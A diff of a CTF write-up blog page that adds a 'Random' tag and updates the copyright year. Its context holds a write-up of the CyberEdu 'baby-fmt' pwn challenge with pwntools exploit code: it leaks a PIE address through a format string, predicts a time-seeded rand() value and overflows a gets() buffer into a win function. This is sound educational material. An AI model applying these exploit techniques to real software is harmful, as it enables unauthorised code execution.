@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>CyberEdu baby-fmt Writeup | Irina&#39;s CTF Writeups</title>
-<meta name="keywords" content="CyberEdu, pwn, buffer-overflow, Format-String">
+<meta name="keywords" content="CyberEdu, pwn, buffer-overflow, Format-String, Random">
 <meta name="description" content="Merry Christmas everyone! 🎄
 Challenge overview
 This is should be a basic pwn challenge but please be aware that time is not your friend.
@@ -94,6 +94,7 @@ We have a function called by main, let’s call it vuln.">
     <meta property="article:tag" content="Pwn">
     <meta property="article:tag" content="Buffer-Overflow">
     <meta property="article:tag" content="Format-String">
+    <meta property="article:tag" content="Random">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CyberEdu baby-fmt Writeup">
 <meta name="twitter:description" content="Merry Christmas everyone! 🎄
@@ -134,7 +135,7 @@ We have a function called by main, let&rsquo;s call it vuln.">
   "name": "CyberEdu baby-fmt Writeup",
   "description": "Merry Christmas everyone! 🎄\nChallenge overview This is should be a basic pwn challenge but please be aware that time is not your friend.\nLet\u0026rsquo;s check out the restrictions we\u0026rsquo;re dealing with.\nWe\u0026rsquo;re working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let\u0026rsquo;s take a look at the disassembled binary.\nWe have a function called by main, let\u0026rsquo;s call it vuln.\n",
   "keywords": [
-    "CyberEdu", "pwn", "buffer-overflow", "Format-String"
+    "CyberEdu", "pwn", "buffer-overflow", "Format-String", "Random"
   ],
   "articleBody": "Merry Christmas everyone! 🎄\nChallenge overview This is should be a basic pwn challenge but please be aware that time is not your friend.\nLet’s check out the restrictions we’re dealing with.\nWe’re working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let’s take a look at the disassembled binary.\nWe have a function called by main, let’s call it vuln.\nThen, a win function.\nA function that checks whether a string passed as an argument appears inside \"bucurest iasi cluj timisoar brasov constant\"\nAnd lastly, a hacking detection function that checks that we didn’t modify the value of dword_402C, a “randomly” generated variable in vuln.\nIdentifying the vulnerabilities Our main concern here should be finding a way to redirect into our win function. So let’s break down what happens in vuln.\nFirst, v5 is assigned a random value like so:\nv0 = time(0); srand(v0); v5 = rand(); dword_402C = v5; This means all random numbers generated this way that same second will be the same.\nNext, we input 8 bytes into s, and then the newline gets turned into a null byte. To access the fmtstr vulnerability, we need to reach the vulnerable branch of the if, which means our s, or city, can’t be contained by the city string.\nThen, the gets(v4); leaves us with a buffer overflow, and v5 operating something like a canary. No problem though, because we can just find it out ourselves.\nAlright, so we can only print values one at at time, because of the small s buffer. Since we can only pick one to see, we’d better find the PIE base and another way to get that v5 random value.\nAt offset 17, I found an address that’s PIE base + 0x148f, and upon checking, it’s actually main. From that, we can calculate win. Next, we just need to simulate the random number generation.\nThe exploit Getting v5 will be pretty easy; we just need to generate our own number with the same lines of code, inside out python script. We can use ctypes for that.\nEssentially, what that means is we can write our own identical C code inside python. To make sure we get the correct number, I took a range of 10 seeds, just in case. Then I picked the one corresponding to the value of dword_402c in gdb with gef, and I settled on the 5th one, which was just now. But I still left the loop in, just in case timings will differ remotely (great foresight on my part).\nfrom pwn import * from ctypes import CDLL import time libc = CDLL(\"/lib/x86_64-linux-gnu/libc.so.6\") now = int(time.time()) i=5 j=1 for seed in range(now - 5, now + 5): libc.srand(seed) random = libc.rand() print(seed, random) if i==j: random_number = random j=j+1 print(f\"random number for i={i} is {random_number}\") Now, we can create our payload properly without getting detected:\np.recvuntil(b'?\\n') p.sendline(b\"%17$p\") p.recvline() main = int(p.recvline().strip(), 16) print(hex(main)) #17 is pie base + 0x148f pie = main - 0x148f win = pie + 0x133b print(hex(win)) p.recvuntil(b'?\\n') #gets(v4) v4 = b\"A\"*5 #the actual v4 buffer v4 += p32(random_number) #4 byte v5 v4 += b'\\x90' * 20 #padding until rbp v4 += b'\\x90' * 8 #rbp, 8 bytes v4 += p64(win) #win finally p.sendline(v4) And, we get our flag locally!\nTime to test it out remotely… We might encounter the problem of different libc versions for the random generator or offsets, or both!\nLooks like it was offsets now.\nI found another PIE looking address at offset 8, and I assumed it was PIE base + 0x1400. I messed around with different i values for a while, and after trying everything from now-5 to now+5, I was ready to give up, but I told myself I’d extend the radius a little and went up to now+10. I set the i to 20 so I would actually use the now+10 seed, and I was completely shocked to see I actually got the flag!\nAs always, the full code can be found on my GitHub here.\n",
   "wordCount" : "680",
@@ -343,13 +344,14 @@ We have a function called by main, let&rsquo;s call it vuln.">
       <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
       <li><a href="https://irinasusca.github.io/writeup-blog/tags/buffer-overflow/">Buffer-Overflow</a></li>
       <li><a href="https://irinasusca.github.io/writeup-blog/tags/format-string/">Format-String</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/random/">Random</a></li>
     </ul>
   </footer>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
 
     <span>
         Powered by
